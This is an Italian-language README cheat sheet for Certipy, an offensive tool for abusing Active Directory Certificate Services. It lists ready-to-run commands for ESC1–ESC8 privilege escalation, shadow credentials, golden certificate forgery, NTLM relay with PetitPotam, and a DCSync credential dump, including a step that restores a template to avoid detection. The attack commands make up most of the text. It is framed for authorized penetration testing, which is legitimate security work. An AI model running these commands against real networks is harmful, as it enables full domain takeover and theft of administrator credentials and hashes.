<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏛️ Certipy - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```
<palign="centro">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<palign="centro">
  <b>🔑 Strumento completo per enumerare e sfruttare le configurazioni errate di Servizi certificati Active Directory (AD CS)</b>
</p>

---

## 📋 Sommario

- [Introduzione](#-introduzione)
- [Perché l'abuso di AD CS?](#-perché-ad-cs-abuse)
- [Installazione](#-installazione)
- [Panoramica sui sottocomandi Certipy](#-certipy-sottocomandi-panoramica)
- [Enumerazione e scoperta (`find`)](#-enumerazione--discovery-find)
- [La matrice delle vulnerabilità dell'ESC](#-the-esc-vulnerability-matrix)
  - [ESC1: Nome alternativo oggetto forniture per iscritti (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2: EKU o SubCA per qualsiasi scopo](#esc2-any-scopo-eku-o-subca)
  - [ESC3: Agente richiesta certificato](#esc3-certificate-request-agent)
  - [ESC4: Controllo dell'accesso ai modelli vulnerabili (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 abilitato](#esc6-editf_attributesubjectaltname2-enabled)
  - [ESC7: Controllo accesso CA vulnerabile](#esc7-vulnerabile-ca-access-control)
  - [ESC8: Inoltro NTLM alla registrazione Web HTTP](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 e ESC10: forti difetti nella mappatura dei certificati](#esc9--esc10-strong-certificate-mapping-flaws)
- [Credenziali Shadow (`shadow`)](#-shadow-credentials-shadow)
- [Certificati d'oro (`forge`)](#-golden-certificates-forge)
- [Autenticazione con PFX (`auth`)](#-autenticazione-con-pfx-auth)
- [Flussi di lavoro di attacco nel mondo reale](#-flussi di lavoro di attacco nel mondo reale)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Suggerimenti e best practice](#-tips--best-practice)
- [Disclaimer legale](#-legal-disclaimer)
- [Risorse](#-risorse)

---

## 🎯 Introduzione

**Certipy** (creato da Oliver Lyak) è il principale strumento basato su Python per l'enumerazione e l'utilizzo di Servizi certificati Active Directory (**AD CS**). AD CS è l'implementazione PKI (Public Key Infrastructure) di Microsoft per le reti Active Directory aziendali, ampiamente utilizzata per l'accesso con smart card, VPN, S/MIME e crittografia TLS interna.

Poiché le configurazioni errate dei certificati consentono spesso agli utenti di dominio non privilegiati di richiedere certificati come amministratori di dominio o controller di dominio, l'abuso di Servizi certificati Active Directory rappresenta uno dei vettori di escalation del dominio più affidabili e di maggiore impatto nei moderni test di penetrazione aziendale.

---

## ⚖️ Perché l'abuso di AD CS?

- ⚡ **Escalation istantanea del dominio:** i modelli di certificato configurati in modo errato spesso garantiscono la compromissione dell'intero dominio in pochi secondi.
- 🔑 **Furtivo e persistente:** i certificati rubati o i certificati d'oro contraffatti possono rimanere validi per anni senza attivare avvisi standard di modifica della password.
- 🔄 **PKINIT in NT Hash:** Certipy autentica i certificati `.pfx` richiesti su Kerberos PKINIT, recuperando l'hash NT in testo semplice del target direttamente dal KDC.

---

## 📥Installazione

### Utilizzo di pipx (consigliato)
```bash
pipx install certipy-ad
```
### Dal repository GitHub
```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```
### Verifica
```bash
certipy -h
```
---

## 🧭 Panoramica dei sottocomandi di Certipy

| Sottocomando | Funzione |
|------------|----------|
| `find` | Enumerare CA, modelli e rilevare vulnerabilità ESC |
| `req` | Richiedi certificati da modelli vulnerabili |
| `auth` | Autenticarsi utilizzando i certificati `.pfx` per recuperare l'hash TGT e NT |
| `ca` | Enumerare e modificare le impostazioni di configurazione della CA |
| `template` | Modifica le impostazioni del modello di certificato (utile in ESC4) |
| `account` | Gestire gli account computer di Active Directory (MachineAccountQuota) |
| `shadow` | Sfrutta le credenziali shadow (`msDS-KeyCredentialLink`) |
| `forge` | Falsificare certificati d'oro utilizzando una chiave privata CA rubata |

---

## 🔍 Enumerazione e scoperta (`find`)

Inizia identificando l'autorità di certificazione aziendale (CA) e analizzando i modelli vulnerabili:
```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```
---

## 💥 La matrice delle vulnerabilità dell'ESC

### ESC1: L'iscritto fornisce il nome alternativo dell'oggetto (SAN)

**Condizione:**
- Gli utenti con privilegi limitati dispongono dei diritti di registrazione (`Client Authentication` EKU abilitato).
- Il modello specifica `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (consente al richiedente di specificare qualsiasi nome alternativo del soggetto, ad esempio l'amministratore del dominio).

**Sfruttamento:**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*L'output produce il TGT dell'amministratore e l'hash NT in testo normale!*

---

### ESC2: EKU o SubCA per qualsiasi scopo

**Condizione:**
- Il modello specifica l'EKU `Any Purpose` o non ha alcun EKU definito.
- Può essere utilizzato per qualsiasi scopo, inclusa l'autenticazione del client.

**Sfruttamento:**
Sfruttato in modo identico a ESC1 o utilizzato in combinazione con ESC3 per ottenere un certificato dell'agente di registrazione.

---

### ESC3: Agente di richiesta certificato

**Condizione:**
- Il modello ha l'EKU `Certificate Request Agent` (agente di registrazione).
- Consente di richiedere certificati per conto di un altro utente attraverso modelli secondari.

**Sfruttamento:**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
---

### ESC4: controllo dell'accesso ai modelli vulnerabili (ACL)

**Condizione:**
- L'utente con privilegi limitati dispone dei diritti `WriteOwner`, `WriteDacl` o `WriteProperty` su un modello di certificato.

**Sfruttamento:**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```
---

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Abilitato

**Condizione:**
- La CA ha il flag `EDITF_ATTRIBUTESUBJECTALTNAME2` impostato, consentendo a qualsiasi richiesta di certificato di specificare SAN arbitrarie indipendentemente dalle impostazioni del modello!

**Sfruttamento:**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```
---

### ESC7: controllo dell'accesso CA vulnerabile

**Condizione:**
- L'utente dispone dei diritti `ManageCA` o `ManageCertificates` sulla CA stessa.

**Sfruttamento:**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```
---

### ESC8: inoltro NTLM alla registrazione Web HTTP

**Condizione:**
- La CA dispone dell'endpoint HTTP di registrazione Web (`/certsrv/`) abilitato con l'autenticazione NTLM senza EPA (protezione estesa per l'autenticazione) e HTTPS.

**Flusso di lavoro di sfruttamento:**
1. Avviare `ntlmrelayx` puntando a CA Web Enrollment:
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. Attiva l'autenticazione automatica forzata tramite PetitPotam o PrinterBug:
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. `ntlmrelayx` inoltra l'autenticazione NTLM dell'account computer del controller di dominio, richiede un certificato del computer e restituisce base64 `.pfx`.
4. Autenticarsi come controller di dominio utilizzando Certipy:
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. Utilizzare l'hash NT del controller di dominio per eseguire un dump DCSync completo con `impacket-secretsdump`.

---

## 👥 Credenziali ombra (`shadow`)

Se un account compromesso ha accesso in scrittura sull'attributo `msDS-KeyCredentialLink` di un altro account:
```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```
---

## 👑 Certificati d'Oro (`forge`)

Se hai compromesso la CA e ne hai estratto la chiave privata:
```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```
---

## 🔑 Autenticazione con PFX (`auth`)
```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
---

## 🎬 Flussi di lavoro di attacco nel mondo reale

### Completa l'acquisizione del dominio ESC1 in 3 comandi
```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```
---

## 📊 Tabella di consultazione rapida

| Compito | Comando |
|------|---------|
| **Elencare AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **Richiedi certificato (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **Autentica PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **Modifica modello (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **Credenziali Shadow** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **Gestisci i diritti CA** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **Certificato d'oro della Forgia** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 Suggerimenti e migliori pratiche

1. **Controlla la sincronizzazione dell'orologio DC:**
   Kerberos PKINIT richiede che l'ora del sistema venga sincronizzata entro 5 minuti dal controller di dominio. Correre:
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **Gestisci KDC_ERR_PADATA_TYPE_NOSUPP:**
   Se `certipy auth` ha esito negativo con questo errore, nel controller di dominio non è installato un certificato del controller di dominio valido per PKINIT. In questo caso, utilizzare l'autenticazione LDAP o SChannel.
3. **Pulisci sempre i modelli ESC4:**
   Quando si modificano i modelli di certificato, conservare e riapplicare sempre la configurazione di backup (`-configuration <FILE>.json`) per evitare di lasciare l'ambiente vulnerabile o causare interruzioni operative.

---

## ⚠️ Disclaimer legale

> **IMPORTANTE:** gli attacchi ai Servizi certificati Active Directory garantiscono un accesso amministrativo critico e di grande impatto alle reti di dominio. Certipy deve essere eseguito solo durante test di penetrazione autorizzati, esercitazioni della squadra rossa e audit di sicurezza etica con autorizzazione scritta.

---

## 📚 Risorse

- [Repository GitHub ufficiale di Certipy](https://github.com/ly4k/Certipy)
- [Libro bianco sull'usato certificato (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Percorsi di attacco e protezioni di AD CS (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)